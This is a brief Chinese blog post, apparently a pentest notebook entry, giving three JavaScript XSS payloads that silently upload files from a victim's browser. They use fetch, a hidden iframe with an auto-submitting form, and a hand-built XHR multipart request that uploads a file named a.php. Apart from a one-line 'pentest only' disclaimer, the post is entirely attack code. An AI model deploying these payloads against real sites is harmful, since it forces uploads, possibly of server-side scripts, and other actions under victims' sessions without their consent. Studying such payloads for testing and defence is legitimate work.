---
title: 使用XSS自动上传表单文件的例子
date: 2024-05-12 16:06:59
tags:
---

仅供渗透测试，禁止他用
方案一：fetch
```javascript
 let formData = new FormData();
formData.append('name', 'John');
formData.append('file', new Blob(['Hello World!\n']), 'test')
fetch("http://www.baidu,com",
  {
    body: formData, method: "post"
  });
```
方案二：iframe
```javascript
	var Iframe=document.createElement("iframe")
Iframe.name="csrf-frame"
Iframe.style="display:none"
var Form = document.createElement("form");
Form.action = "http://www.baidu.com";
Form.method = "post";
Form.setAttribute("enctype", "multipart/form-data");
 
Form.target = "csrf-frame";
var Input= document.createElement("input");
Input.type='hidden'
Input.name='a'
Input.value='b'
 
const dataTransfer = new DataTransfer();
var fileInput= document.createElement("input");
 Form.appendChild(Input)
 document.body.appendChild(Iframe)
 
dataTransfer.items.add(
          new File(['Hello World!\n'], 'test', {
            type: 'application/octet-stream'
          })
        );
fileInput.setAttribute("name", "file");
 
 fileInput.setAttribute("type", "file");
 
 fileInput.files = dataTransfer.files;
Form.appendChild(fileInput)
var formToSubmit = document.body.appendChild(Form);
formToSubmit.submit();
```
方案三：

```javascript

  if (XMLHttpRequest.prototype.sendAsBinary === undefined) {
  XMLHttpRequest.prototype.sendAsBinary = function(string) {
    var bytes = Array.prototype.map.call(string, function(c) {
        return c.charCodeAt(0) & 0xff;
    });
    this.send(new Uint8Array(bytes));
  };
}
  var boundary = '----ThisIsTheBoundary1234567890';
  var formData = '--' + boundary + '\r\n'
  formData += 'Content-Disposition: form-data; name="source"; filename="a.php"\r\n';
  formData += 'Content-Type: application/octet-stream\r\n\r\n';
  formData += 'Data';
  formData += '\r\n';
  formData += '--' + boundary + '\r\n';
  formData += 'Content-Disposition: form-data; name="message"\r\n\r\n';
  formData += 'message' + '\r\n'
  formData += '--' + boundary + '--\r\n';
 
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'haha', true);
  xhr.onload　 = xhr.onerror　 = function() {
      console.log(xhr.responseText);
  };
  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
  xhr.sendAsBinary(formData);
```

